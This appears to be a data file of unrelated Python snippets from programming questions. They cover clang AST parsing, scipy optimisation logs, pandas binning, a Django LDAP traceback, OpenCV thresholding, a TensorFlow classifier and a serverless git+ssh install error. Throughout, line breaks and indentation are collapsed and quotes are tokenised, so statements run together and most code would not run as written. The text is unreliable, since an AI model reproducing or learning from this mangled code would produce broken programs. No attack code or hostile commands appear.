"import sysfrom clang.cindex import *def nodeinfo ( n ) : return ( n.kind , n.is_anonymous ( ) , n.spelling , n.type.spelling ) idx = Index.create ( ) # translation unit parsed correctlytu = idx.parse ( sys.argv [ 1 ] , [ '-std=c++11 ' ] ) assert ( len ( tu.diagnostics ) == 0 ) for n in tu.cursor.walk_preorder ( ) : if n.kind == CursorKind.STRUCT_DECL and n.is_anonymous ( ) : print nodeinfo ( n ) if n.kind == CursorKind.UNION_DECL and n.is_anonymous ( ) : print nodeinfo ( n ) if n.kind == CursorKind.ENUM_DECL : if n.is_anonymous ( ) : print nodeinfo ( n ) else : print 'INCORRECT ' , nodeinfo ( n ) enum { VAL = 1 } ; struct s { struct { } ; union { int x ; float y ; } ; } ; INCORRECT ( CursorKind.ENUM_DECL , False , `` , ' ( anonymous enum at sample1.cpp:1:1 ) ' ) ( CursorKind.STRUCT_DECL , True , `` , 's : : ( anonymous struct at sample1.cpp:8:5 ) ' ) ( CursorKind.UNION_DECL , True , `` , 's : : ( anonymous union at sample1.cpp:9:5 ) ' )"
"sol0 = minimize ( objective , x0 , args=mock_df , method='trust-constr ' , bounds=bnds , constraints=cons , options= { 'maxiter ' : 250 , 'verbose ' : 3 } ) | niter |f evals|CG iter| obj func |tr radius | opt | c viol | penalty |barrier param|CG stop|| -- -- -- -| -- -- -- -| -- -- -- -| -- -- -- -- -- -- -| -- -- -- -- -- | -- -- -- -- -- | -- -- -- -- -- | -- -- -- -- -- | -- -- -- -- -- -- -| -- -- -- -|C : \ProgramData\Anaconda3\lib\site-packages\scipy\optimize\_trustregion_constr\projections.py:182 : UserWarning : Singular Jacobian matrix . Using SVD decomposition to perform the factorizations . warn ( 'Singular Jacobian matrix . Using SVD decomposition to ' +| 1 | 31 | 0 | -4.4450e+02 | 1.00e+00 | 7.61e+02 | 5.00e-01 | 1.00e+00 | 1.00e-01 | 0 |C : \ProgramData\Anaconda3\lib\site-packages\scipy\optimize\_hessian_update_strategy.py:187 : UserWarning : delta_grad == 0.0 . Check if the approximated function is linear . If the function is linear better results can be obtained by defining the Hessian as zero instead of using quasi-Newton approximations . 'approximations . ' , UserWarning ) | 2 | 62 | 1 | -2.2830e+03 | 6.99e+00 | 3.64e+02 | 7.28e-01 | 1.00e+00 | 1.00e-01 | 2 || 3 | 93 | 2 | -9.7651e+03 | 3.42e+01 | 5.52e+01 | 5.33e+00 | 1.00e+00 | 1.00e-01 | 2 || 4 | 124 | 26 | -4.9999e+03 | 3.42e+01 | 8.23e+01 | 9.29e-01 | 3.48e+16 | 1.00e-01 | 1 || 5 | 155 | 50 | -4.1486e+03 | 3.42e+01 | 5.04e+01 | 2.08e-01 | 3.48e+16 | 1.00e-01 | 1 | ... | 56 | 1674 | 1127 | -1.6146e+03 | 1.77e-08 | 4.49e+00 | 3.55e-15 | 3.66e+33 | 1.00e-01 | 1 || 57 | 1705 | 1151 | -1.6146e+03 | 1.77e-09 | 4.49e+00 | 3.55e-15 | 3.66e+33 | 1.00e-01 | 1 || 58 | 1736 | 1151 | -1.6146e+03 | 1.00e+00 | 4.42e+00 | 3.55e-15 | 1.00e+00 | 2.00e-02 | 0 || 59 | 1767 | 1175 | -1.6146e+03 | 1.00e-01 | 4.42e+00 | 3.55e-15 | 1.00e+00 | 2.00e-02 | 1 || 60 | 1798 | 1199 | -1.6146e+03 | 1.00e-02 | 4.42e+00 | 3.55e-15 | 1.00e+00 | 2.00e-02 | 1 | ... | 66 | 1984 | 1343 | -1.6146e+03 | 1.00e-08 | 4.42e+00 | 3.55e-15 | 1.00e+00 | 2.00e-02 | 1 || 67 | 2015 | 1367 | -1.6146e+03 | 1.00e-09 | 4.42e+00 | 3.55e-15 | 1.00e+00 | 2.00e-02 | 1 || 68 | 2046 | 1367 | -1.6146e+03 | 1.00e+00 | 4.36e+00 | 3.55e-15 | 1.00e+00 | 4.00e-03 | 0 || 69 | 2077 | 1391 | -1.6146e+03 | 1.00e-01 | 4.36e+00 | 3.55e-15 | 1.00e+00 | 4.00e-03 | 1 | ... | 77 | 2325 | 1583 | -1.6146e+03 | 1.00e-09 | 4.36e+00 | 3.55e-15 | 1.00e+00 | 4.00e-03 | 1 || 78 | 2356 | 1583 | -1.6146e+03 | 1.00e+00 | 4.35e+00 | 3.55e-15 | 1.00e+00 | 8.00e-04 | 0 || 79 | 2387 | 1607 | -1.6146e+03 | 1.00e-01 | 4.35e+00 | 3.55e-15 | 1.00e+00 | 8.00e-04 | 1 | ... | 87 | 2635 | 1799 | -1.6146e+03 | 1.00e-09 | 4.35e+00 | 3.55e-15 | 1.00e+00 | 8.00e-04 | 1 || 88 | 2666 | 1799 | -1.6146e+03 | 1.00e+00 | 4.34e+00 | 3.55e-15 | 1.00e+00 | 1.60e-04 | 0 || 89 | 2697 | 1823 | -1.6146e+03 | 1.00e-01 | 4.34e+00 | 3.55e-15 | 1.00e+00 | 1.60e-04 | 1 | ... | 97 | 2945 | 2015 | -1.6146e+03 | 1.00e-09 | 4.34e+00 | 3.55e-15 | 1.00e+00 | 1.60e-04 | 1 || 98 | 2976 | 2015 | -1.6146e+03 | 1.00e+00 | 4.34e+00 | 3.55e-15 | 1.00e+00 | 3.20e-05 | 0 || 99 | 3007 | 2039 | -1.6146e+03 | 1.00e-01 | 4.34e+00 | 3.55e-15 | 1.00e+00 | 3.20e-05 | 1 | ... | 167 | 5053 | 3527 | -1.6146e+03 | 1.00e-07 | 1.35e+01 | 2.12e-11 | 1.00e+00 | 2.05e-09 | 1 || 168 | 5084 | 3551 | -1.6146e+03 | 1.00e-08 | 1.35e+01 | 2.12e-11 | 1.00e+00 | 2.05e-09 | 1 || 169 | 5115 | 3575 | -1.6146e+03 | 1.00e-09 | 1.35e+01 | 2.12e-11 | 1.00e+00 | 2.05e-09 | 1 | ` xtol ` termination condition is satisfied.Number of iterations : 169 , function evaluations : 5115 , CG iterations : 3575 , optimality : 1.35e+01 , constraint violation : 2.12e-11 , execution time : 3.8e+02 s. con0 = { 'type ' : 'eq ' , 'fun ' : constraint0 }"
from facebook.djangofb import facebook
app_one ( git repo ) | -- app_one ( actual app uses by projects ) | + -- models.py | -- README.md + -- setup.pyproject_one ( git repo ) | -- project_one | | -- apps | | | -- app_one | | | + -- models.py | | | -- app_two | -- setup.cfg + -- setup.pyproject_two ( git repo ) | -- project_two | | -- apps | | | -- app_one ( same app as project_one ) | | | + -- models.py | | | -- app_two | -- setup.cfg + -- setup.py
"import pandas as pdimport numpy as npn = 100df = pd.DataFrame ( { `` x '' : np.random.randn ( n ) , `` A '' : np.random.randn ( n ) +5 , `` B '' : np.random.randn ( n ) +10 } ) x A B0 -0.585313 6.038620 9.9097621 0.412323 3.991826 8.8368482 0.211713 5.019520 9.6673493 0.710699 5.353677 9.7579034 0.681418 4.452754 10.647738 # define bin rangesbins_A = np.arange ( 3 , 8 ) bins_B = np.arange ( 8 , 13 ) # prepare output listsA_mins= [ ] A_maxs= [ ] B_mins= [ ] B_maxs= [ ] x_means= [ ] x_stds= [ ] x_counts= [ ] # loop over binsfor i_A in range ( 0 , len ( bins_A ) -1 ) : A_min = bins_A [ i_A ] A_max = bins_A [ i_A+1 ] for i_B in range ( 0 , len ( bins_B ) -1 ) : B_min = bins_B [ i_B ] B_max = bins_B [ i_B+1 ] # binning conditions for current step conditions = np.logical_and.reduce ( [ df [ `` A '' ] > A_min , df [ `` A '' ] < A_max , df [ `` B '' ] > B_min , df [ `` B '' ] < B_max , ] ) # calculate statistics for x and store values in lists x_values = df.loc [ conditions , `` x '' ] x_means.append ( x_values.mean ( ) ) x_stds.append ( x_values.std ( ) ) x_counts.append ( x_values.count ( ) ) A_mins.append ( A_min ) A_maxs.append ( A_max ) B_mins.append ( B_min ) B_maxs.append ( B_max ) binned = pd.DataFrame ( data= { `` A_min '' : A_mins , `` A_max '' : A_maxs , `` B_min '' : B_mins , `` B_max '' : B_maxs , `` x_mean '' : x_means , `` x_std '' : x_stds , `` x_count '' : x_counts } ) A_min A_max B_min B_max x_mean x_std x_count0 3 4 8 9 0.971624 0.790972 21 3 4 9 10 0.302795 0.380102 32 3 4 10 11 0.447398 1.787659 53 3 4 11 12 0.462149 1.195844 24 4 5 8 9 0.379431 0.983965 4"
"Traceback ( most recent call last ) : File `` /usr/local/lib/python2.7/site-packages/django/core/handlers/exception.py '' , line 42 , in inner response = get_response ( request ) File `` /usr/local/lib/python2.7/site-packages/django/core/handlers/base.py '' , line 249 , in _legacy_get_response response = self._get_response ( request ) File `` /usr/local/lib/python2.7/site-packages/django/core/handlers/base.py '' , line 187 , in _get_response response = self.process_exception_by_middleware ( e , request ) File `` /usr/local/lib/python2.7/site-packages/django/core/handlers/base.py '' , line 185 , in _get_response response = wrapped_callback ( request , *callback_args , **callback_kwargs ) File `` /usr/local/lib/python2.7/site-packages/django/contrib/auth/views.py '' , line 47 , in inner return func ( *args , **kwargs ) File `` /usr/local/lib/python2.7/site-packages/django/views/decorators/debug.py '' , line 76 , in sensitive_post_parameters_wrapper return view ( request , *args , **kwargs ) File `` /usr/local/lib/python2.7/site-packages/django/utils/decorators.py '' , line 149 , in _wrapped_view response = view_func ( request , *args , **kwargs ) File `` /usr/local/lib/python2.7/site-packages/django/views/decorators/cache.py '' , line 57 , in _wrapped_view_func response = view_func ( request , *args , **kwargs ) File `` /usr/local/lib/python2.7/site-packages/django/contrib/auth/views.py '' , line 81 , in login if form.is_valid ( ) : File `` /usr/local/lib/python2.7/site-packages/django/forms/forms.py '' , line 169 , in is_valid return self.is_bound and not self.errors File `` /usr/local/lib/python2.7/site-packages/django/forms/forms.py '' , line 161 , in errors self.full_clean ( ) File `` /usr/local/lib/python2.7/site-packages/django/forms/forms.py '' , line 371 , in full_clean self._clean_form ( ) File `` /usr/local/lib/python2.7/site-packages/django/forms/forms.py '' , line 398 , in _clean_form cleaned_data = self.clean ( ) File `` /usr/local/lib/python2.7/site-packages/django/contrib/auth/forms.py '' , line 191 , in clean self.user_cache = authenticate ( username=username , password=password ) File `` /usr/local/lib/python2.7/site-packages/django/contrib/auth/__init__.py '' , line 74 , in authenticate user = backend.authenticate ( **credentials ) File `` /itapp/itapp/backend.py '' , line 39 , in authenticate ldap.set_option ( ldap.OPT_X_TLS_CACERTFILE , settings.AD_CERT_FILE ) File `` /usr/local/lib/python2.7/site-packages/ldap/functions.py '' , line 135 , in set_option return _ldap_function_call ( None , _ldap.set_option , option , invalue ) File `` /usr/local/lib/python2.7/site-packages/ldap/functions.py '' , line 66 , in _ldap_function_call result = func ( *args , **kwargs ) ValueError : option error alexs-mbp : ~ alex $ brew install openldapWarning : openldap is a keg-only and another version is linked to opt.Use ` brew install -- force ` if you want to install this versionalexs-mbp : ~ alex $ brew install openldap -- forceWarning : openldap-2.4.44 already installed , it 's just not linked . alexs-mbp : ~ alex $ sudo pip install python-ldapThe directory '/Users/alex/Library/Caches/pip/http ' or its parent directory is not owned by the current user and the cache has been disabled . Please check the permissions and owner of that directory . If executing pip with sudo , you may want sudo 's -H flag.The directory '/Users/alex/Library/Caches/pip ' or its parent directory is not owned by the current user and caching wheels has been disabled . check the permissions and owner of that directory . If executing pip with sudo , you may want sudo 's -H flag.Requirement already satisfied : python-ldap in /usr/local/lib/python2.7/site-packagesRequirement already satisfied : setuptools in /usr/local/lib/python2.7/site-packages ( from python-ldap"
__all__ = [ 'get_includes ' ] + core.__all__
"class Party ( models.Model ) : `` '' '' Note this is a concrete model , not an abstract one. `` '' '' name = models.CharField ( max_length=20 ) class Organization ( Party ) : `` '' '' Note that a one-to-one relation 'party_ptr ' is automatically added , and this is used as the primary key ( the actual table has no 'id ' column ) . The same holds for Person. `` '' '' type = models.CharField ( max_length=20 ) class Person ( Party ) : favorite_color = models.CharField ( max_length=20 ) class Address ( models.Model ) : `` '' '' Note that , because Party is a concrete model , rather than an abstract one , we can reference it directly in a foreign key . Since the Person and Organization models have one-to-one relations with Party which act as primary key , we can conveniently create Address objects setting either party=party_instance , party=organization_instance , or party=person_instance. `` '' '' party = models.ForeignKey ( to=Party , on_delete=models.CASCADE )"
"ForTest├── test_module│ └── test_suite.py└── test_runner.py def test_1 ( ) : passdef test_2 ( ) : pass import nosenose.main ( argv= [ `` , '-v ' ] ) .run_and_exit ( ) test_suite.test_1 ... oktest_suite.test_2 ... oktest_suite.test_1 ... oktest_suite.test_2 ... ok -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Ran 2 tests in 0.002sOK"
TimeGenerated EventID Username Message2012-04-01 00:00:13 4624 Matthew This guy logged onto the computer for the first time today2012-04-01 00:00:14 4624 Matthew This guy authenticated for some stuff 2012-04-01 00:00:15 4624 Adam This guy logged onto the computer for the first time today2012-04-01 00:00:16 4624 James This guy logged onto the computer for the first time today2012-04-01 12:00:17 4624 Adam This guy authenticated for some stuff2012-04-01 12:00:18 4625 James This guy logged off the computer for the last time today2012-04-01 12:00:19 4624 Adam This guy authenticated for some stuff2012-04-01 12:00:20 4625 Adam This guy logged off the computer for the last time today 2012-04-01 12:00:21 4625 Matthew This guy logged off the computer for the last time today
myLock.acquire ( ) doStuff ( ) myLock.release ( ) with myLock : doStuff ( )
"class Person ( db.Model ) : daily_rula_average_ranges = db.relationship ( 'DailyRulaAverageRange ' , order_by= '' DailyRulaAverageRange.date '' , back_populates='person ' ) @ hybrid_property def last_assessment ( self ) : if self.daily_rula_average_ranges.length > 0 : return self.daily_rula_average_ranges [ -1 ] class PersonSchema ( ma.Schema ) : last_assessment = ma.Nested ( DailyRulaAverageRangeSchema , only= [ 'id ' , 'date ' , 'risk ' ] ) class Meta : fields = ( 'last_assessment ' )"
"import numpy as npimport cv2img = cv2.imread ( 'dice.jpg ' ) # Colour range to be extractedlower_blue = np.array ( [ 0,0,0 ] ) upper_blue = np.array ( [ 24,24,24 ] ) # Threshold the BGR image dots = cv2.inRange ( img , lower_blue , upper_blue ) # Colour range to be extractedlower_blue = np.array ( [ 0,0,0 ] ) upper_blue = np.array ( [ 226,122,154 ] ) # Threshold the BGR image upper_side_shape = cv2.inRange ( img , lower_blue , upper_blue ) cv2.imshow ( 'Upper side shape ' , upper_side_shape ) cv2.imshow ( 'Dots ' , dots ) cv2.waitKey ( 0 ) cv2.destroyAllWindows ( )"
"100 % 1/1 [ 00:00 < 00:00 , 23.74it/s ] def computestacklen grayimgs 2gray_imgs [ 0 ] shape ( 500 , 333 ) len lapylpyrcolor 3 , len lapylpyrcolor [ 0 ] 5len lapylpyrcolor 3 , len lapylpyrcolor [ 0 ] 5fusedgray shape ( 500 , 333 ) def vizpyramid^C"
"from voluptuous import Schema , Requiredfrom pprint import pprintschema = Schema ( { Required ( 'name ' ) : str , Required ( 'www ' ) : str , } ) data = { 'name ' : 'Foo ' , 'www ' : u'http : //www.foo.com ' , } pprint ( data ) schema ( data ) voluptuous.MultipleInvalid : expected str for dictionary value @ data [ 'www ' ]"
"# preprocessinginput = np.loadtxt ( `` input.csv '' , delimiter= '' , '' , ndmin=2 ) .astype ( np.float32 ) labels = np.loadtxt ( `` label.csv '' , delimiter= '' , '' , ndmin=2 ) .astype ( np.float32 ) train_size = 0.9train_cnt = floor ( inp.shape [ 0 ] * train_size ) x_train = input [ 0 : train_cnt ] y_train = labels [ 0 : train_cnt ] x_test = input [ train_cnt : ] y_test = labels [ train_cnt : ] # defining parameterslearning_rate = 0.01training_epochs = 100batch_size = 50n_classes = labels.shape [ 1 ] n_samples = 9578n_inputs = input.shape [ 1 ] n_hidden_1 = 20n_hidden_2 = 20def multilayer_network ( X , weights , biases , keep_prob ) : ' '' X : Placeholder for data inputsweights : dictionary of weightsbiases : dictionary of bias values '' ' # first hidden layer with sigmoid activation # sigmoid ( X*W+b ) layer_1 = tf.add ( tf.matmul ( X , weights [ 'h1 ' ] ) , biases [ 'h1 ' ] ) layer_1 = tf.nn.sigmoid ( layer_1 ) layer_1 = tf.nn.dropout ( layer_1 , keep_prob ) # second hidden layerlayer_2 = tf.add ( tf.matmul ( layer_1 , weights [ 'h2 ' ] ) , biases [ 'h2 ' ] ) layer_2 = tf.nn.sigmoid ( layer_2 ) layer_2 = tf.nn.dropout ( layer_2 , keep_prob ) # output layerout_layer = tf.matmul ( layer_2 , weights [ 'out ' ] ) + biases [ 'out ' ] return out_layer # defining the weights and biases dictionary weights = { 'h1 ' : tf.Variable ( tf.random_normal ( [ n_inputs , n_hidden_1 ] ) ) , 'h2 ' : tf.Variable ( tf.random_normal ( [ n_hidden_1 , n_hidden_2 ] ) ) , 'out ' : tf.Variable ( tf.random_normal ( [ n_hidden_2 , n_classes ] ) ) } biases = { 'h1 ' : tf.Variable ( tf.random_normal ( [ n_hidden_1 ] ) ) , 'h2 ' : tf.Variable ( tf.random_normal ( [ n_hidden_2 ] ) ) , 'out ' : tf.Variable ( tf.random_normal ( [ n_classes ] ) ) } keep_prob = tf.placeholder ( `` float '' ) X = tf.placeholder ( tf.float32 , [ None , n_inputs ] ) Y = tf.placeholder ( tf.float32 , [ None , n_classes ] ) predictions = multilayer_network ( X , weights , biases , keep_prob ) # cost function ( loss ) and optimizer functioncost = tf.reduce_mean ( tf.nn.sigmoid_cross_entropy_with_logits ( logits=predictions , labels=Y ) ) optimizer = tf.train.AdamOptimizer ( learning_rate=learning_rate ) .minimize ( cost ) # running the sessioninit = tf.global_variables_initializer ( ) with tf.Session ( ) as sess : sess.run ( init ) # for loopfor epoch in range ( training_epochs ) : avg_cost = 0.0 total_batch = int ( len ( x_train ) / batch_size ) x_batches = np.array_split ( x_train , total_batch ) y_batches = np.array_split ( y_train , total_batch ) for i in range ( total_batch ) : batch_x , batch_y = x_batches [ i ] , y_batches [ i ] _ , c = sess.run ( [ optimizer , cost ] , feed_dict= { X : batch_x , Y : batch_y , keep_prob : 0.8 } ) avg_cost += c / total_batch print ( `` Epoch : '' , ' % 04d ' % ( epoch+1 ) , `` cost= '' , \ `` { : .9f } '' .format ( avg_cost ) ) print ( `` Model has completed { } epochs of training '' .format ( training_epochs ) ) correct_prediction = tf.equal ( tf.argmax ( predictions , 1 ) , tf.argmax ( Y , 1 ) ) accuracy = tf.reduce_mean ( tf.cast ( correct_prediction , `` float '' ) ) print ( `` Accuracy : '' , accuracy.eval ( { X : x_test , Y : y_test , keep_probs=1.0 } ) ) for epoch in range ( training_epochs ) : avg_cost = 0.0 total_batch = int ( len ( x_train ) / batch_size ) x_batches = np.array_split ( x_train , total_batch ) y_batches = np.array_split ( y_train , total_batch ) for i in range ( total_batch ) : batch_x , batch_y = x_batches [ i ] , y_batches [ i ] _ , c , p = sess.run ( [ optimizer , cost , predictions ] , feed_dict= { X : batch_x , Y : batch_y , keep_prob : 0.8 } ) avg_cost += c / total_batch print ( `` Epoch : '' , ' % 04d ' % ( epoch+1 ) , `` cost= '' , \ `` { : .9f } '' .format ( avg_cost ) ) y_pred = sess.run ( tf.argmax ( predictions , 1 ) , feed_dict= { X : x_test , keep_prob:1.0 } ) y_true = sess.run ( tf.argmax ( y_test , 1 ) ) acc = sess.run ( accuracy , feed_dict= { X : x_test , Y : y_test , keep_prob:1.0 } ) print ( 'Accuracy : ' , acc ) print ( ' -- -- -- -- -- -- -- - ' ) print ( y_pred , y_true ) print ( `` Model has completed { } epochs of training '' .format ( training_epochs ) ) Epoch : 0001 cost= 0.543714217Accuracy : 1.0 -- -- -- -- -- -- -- - [ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 ] [ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 00 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 ]"
"import restr='12454v're.sub ( ' [ ^0-9 ] ' , '' , str ) # return '12454 '"
"def writecode ( q , a , b , c ) : while b < q : b = b + 1 print `` v % d_ % d_ % d = pairwise ( caps [ % d ] , sals [ % d ] , poss [ % d ] , poss [ % d ] , poss [ % d ] , pos_range ) '' % ( a , b , c , a , a , a , b , c ) print `` votes % d_ % d.append ( v % d_ % d_ % d ) '' % ( b , c , a , b , c , ) print `` v % d_ % d_ % d = pairwise ( caps [ % d ] , sals [ % d ] , poss [ % d ] , poss [ % d ] , poss [ % d ] , pos_range ) '' % ( a , c , b , a , a , a , c , b ) print `` votes % d_ % d.append ( v % d_ % d_ % d ) '' % ( c , b , a , c , b ) writecode ( 5,1,0,4 ) def writecode ( q , a , b , c ) : while b < q : b = b + 1 data_to_write = `` v % d_ % d_ % d = pairwise ( caps [ % d ] , sals [ % d ] , poss [ % d ] , poss [ % d ] , poss [ % d ] , pos_range ) '' % ( a , b , c , a , a , a , b , c ) data_to_write_two = `` votes % d_ % d.append ( v % d_ % d_ % d ) '' % ( b , c , a , b , c , ) data_to_write_three = `` v % d_ % d_ % d = pairwise ( caps [ % d ] , sals [ % d ] , poss [ % d ] , poss [ % d ] , poss [ % d ] , pos_range ) '' % ( a , c , b , a , a , a , c , b ) data_to_write_four = `` votes % d_ % d.append ( v % d_ % d_ % d ) '' % ( c , b , a , c , b ) return data_to_write return data_to_write_two return data_to_write_three return data_to_write_fourx = writecode ( 5,1,0,4 ) out_file = open ( `` code.txt '' , `` a '' ) out_file.write ( x ) out_file.close ( )"
def my_function ( ) : s = something.that.might.go_wrong ( ) return sdef main ( ) : try : s = my_function ( ) except Exception : print `` Error '' def my_function ( ) : try : s = something.that.might.go_wrong ( ) return s except Exception : print `` Error '' def main ( ) : s = my_function ( )
while True : try : cur.execute ( query ) break except TransactionRollbackError : [ sleep a little ] continue except Exception : [ handle error here ]
itsdangerous==0.24boto3 > =1.7git+ssh : //git @ github.com/company/repo.git # egg=my_alias plugins : - serverless-python-requirements - serverless-wsgicustom : wsgi : app : app.app packRequirements : false pythonRequirements : dockerizePip : true dockerSsh : true sls deploy -- aws-profile my_id -- stage dev -- region eu-west-1 Command `` git clone -q ssh : //git @ github.com/company/repo.git /tmp/pip-install-a0_8bh5a/my_alias '' failed with error code 128 in None
